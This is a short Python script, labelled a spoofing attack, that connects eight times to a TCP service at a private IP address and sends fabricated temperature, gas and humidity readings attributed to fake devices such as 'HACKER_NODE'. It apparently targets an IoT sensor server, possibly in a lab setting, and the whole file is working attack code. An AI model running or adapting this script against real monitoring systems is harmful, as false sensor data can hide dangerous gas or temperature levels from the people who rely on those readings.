import socket
import time
import random

HOST = "10.194.116.77"
PORT = 5000

fake_devices = ["HACKER_NODE", "FAKE_SENSOR", "UNKNOWN_DEVICE"]

print("[*] Starting Spoofing Attack...")

for i in range(8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))

        temp = round(random.uniform(25, 30), 2)
        gas = round(random.uniform(1200, 1800), 2)
        hum = round(random.uniform(25, 35), 2)

        fake_source = random.choice(fake_devices)

        payload = f"{temp},{gas},{hum},{fake_source}"
        s.send(payload.encode())

        try:
            response = s.recv(1024).decode().strip()
            print(f"[{i+1}] Response: {response}")
        except:
            pass

        s.close()
        time.sleep(1)

    except Exception as e:
        print("Error:", e)

print("[*] Spoofing Attack Finished")